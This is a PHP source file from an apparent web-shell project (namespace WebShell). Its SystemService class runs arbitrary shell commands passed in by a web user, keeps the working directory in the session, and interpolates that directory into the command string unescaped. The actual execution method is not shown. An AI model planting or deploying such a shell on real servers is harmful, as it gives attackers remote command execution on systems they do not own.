<?php
namespace WebShell;

class SystemService extends Singleton
{
    // Class attributes
    private $executionMethod = null;
    
    public function execute(string $cmd): string
    {
        $output = '';

        // If it is a `cd` command, update the current dir. Else, run the command
        if(str_starts_with($cmd, 'cd ')) {
            $output = $this->handleCDCommand($cmd);
        } else {
            // If the cwd has been updated at any time, append a cd to the command
            $currentDir = (array_key_exists('cwd', $_SESSION)) ? $_SESSION['cwd'] : '';
            $preparedCommand = ($currentDir == '') ? $cmd : "cd '$currentDir' && $cmd";

            // Run the command
            $output = $this->executionMethod->execute($preparedCommand);
        }

        return $output;
    }

    public function setExecutionMethod(ExecutionMethod $executionMethod): void
    {
        $this->executionMethod = $executionMethod;
    }

    public function getCurrentDir(): string
    {
        $currentDir = '';

        // If no current dir is stored, run a `pwd` command. Else, return the stored dir
        if(!array_key_exists('cwd', $_SESSION)) {
            $currentDir = rtrim($this->executionMethod->execute('pwd'));
        } else {
            $currentDir = $_SESSION['cwd'];
        }

        return $currentDir;
    }

    private function handleCDCommand($cmd): string
    {
        // If the command fails, return current directory
        $output = $this->getCurrentDir();

        // Get the target directory
        $targetDir = substr($cmd, 3, strlen($cmd) - 3);

        // Check if the path is relative and if so, append it to the current path
        if ($targetDir[0] !== '/') {
            $targetDir = $this->getCurrentDir() . '/' . $targetDir;
        }

        if (is_dir($targetDir)) {
            $_SESSION['cwd'] = $targetDir;
            $output = $targetDir;
        }

        return $output;
    }
}
?>
